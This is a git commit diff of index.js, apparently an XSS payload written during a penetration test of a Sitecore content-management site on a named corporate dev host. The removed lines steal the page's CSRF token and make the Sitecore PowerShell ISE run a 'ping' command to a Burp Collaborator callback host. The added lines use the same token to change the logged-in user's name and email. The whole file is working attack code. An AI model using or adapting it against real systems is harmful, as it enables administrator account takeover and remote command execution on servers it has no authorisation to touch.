97a5dec6cbc1eda6d035d9dc691d6a20e8b3a3ad
portalstr <92850422+portalstr@users.noreply.github.com>
2021-11-04 15:33:55 +0200

    Update index.js

--- index.js
+++ index.js
@@ -1,20 +1,10 @@
 var req = new XMLHttpRequest();
 req.onload = handleResponse;
-req.open('get','/sitecore/shell/Applications/PowerShell/PowerShellIse?sc_bw=1',true);
+req.open('get','/sitecore/shell/default.aspx?xmlcontrol=ChangeUserInformation',true);
 req.send();
 function handleResponse() {
     var token = this.responseText.match(/name="__CSRFTOKEN" value="(\w+)"/)[1];
     var changeReq = new XMLHttpRequest();
-    changeReq.open('post', '/sitecore/shell/Applications/PowerShell/PowerShellIse?sc_bw=1', true);
-    changeReq.send('&__PARAMETERS=ise%3Aexecute%28elevationResult%3D1%29%28elevationResult%3D1%29&__EVENTTARGET=&__EVENTARGUMENT=&__SOURCE=&__EVENTTYPE=&__CONTEXTMENU=&__MODIFIED=1&__ISEVENT=1&__CSRFTOKEN='+token+'&__VIEWSTATE=53FA2EB0484946FFAF434AC1946D5FEF&__VIEWSTATE=&scActiveRibbonStrip=&scGalleries=&SelectionText=&SelectionRange=&Breakpoints=&Editor=ping%20md3zgmlfptx9nyeladjwxhwe45axym.burpcollaborator.net')
-};
-var req = new XMLHttpRequest();
-req.onload = handleResponse;
-req.open('get','/sitecore/shell/Applications/PowerShell/PowerShellIse?sc_bw=1',true);
-req.send();
-function handleResponse() {
-    var token = this.responseText.match(/name="__CSRFTOKEN" value="(\w+)"/)[1];
-    var changeReq = new XMLHttpRequest();
-    changeReq.open('post', '/sitecore/shell/Applications/PowerShell/PowerShellIse?sc_bw=1', true);
-    changeReq.send('&__PARAMETERS=pstaskmonitor%3Acheck&__EVENTTARGET=&__EVENTARGUMENT=&__SOURCE=&__EVENTTYPE=&__CONTEXTMENU=&__MODIFIED=1&__ISEVENT=1&__CSRFTOKEN='+token+'&__VIEWSTATE=&scActiveRibbonStrip=&SelectionText=&SelectionRange=&Breakpoints=&Editor=ping%20md3zgmlfptx9nyeladjwxhwe45axym.burpcollaborator.net')
+    changeReq.open('post', '/sitecore/shell/default.aspx?xmlcontrol=ChangeUserInformation', true);
+    changeReq.send('&__PARAMETERS=&__EVENTTARGET=OK&__EVENTARGUMENT=&__SOURCE=OK&__EVENTTYPE=click&__CONTEXTMENU=&__MODIFIED=1&__ISEVENT=1&__SHIFTKEY=&__CTRLKEY=&__ALTKEY=&__BUTTON=0&__KEYCODE=undefined&__X=374&__Y=571&__URL=https%3A//cm.dxp-dev.lenovo.com/sitecore/shell/default.aspx%3Fxmlcontrol%3DChangeUserInformation&__CSRFTOKEN='+token+'&__VIEWSTATE=343AB472B5D94A4EBD5E12A4D7DD5642&__VIEWSTATE=&Fullname=dxpPentetsUserxss&Email=lr%40moc.moc')
 };
